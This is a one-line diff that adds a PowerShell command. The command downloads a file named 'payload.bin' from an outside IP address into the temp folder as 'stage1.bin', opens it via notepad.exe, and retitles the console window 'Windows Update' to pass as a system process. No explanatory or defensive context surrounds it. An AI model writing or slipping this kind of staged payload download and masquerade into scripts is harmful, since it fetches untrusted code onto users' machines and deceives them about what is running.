@@ -1,0 +1,1 @@
+$PayloadUrl = 'https://198.51.100.124/payload.bin'; $PayloadPath = "$env:TEMP\stage1.bin"; Start-BitsTransfer -Source $PayloadUrl -Destination $PayloadPath; Start-Process -FilePath "notepad.exe" -ArgumentList $PayloadPath; $Host.UI.RawUI.WindowTitle = "Windows Update"
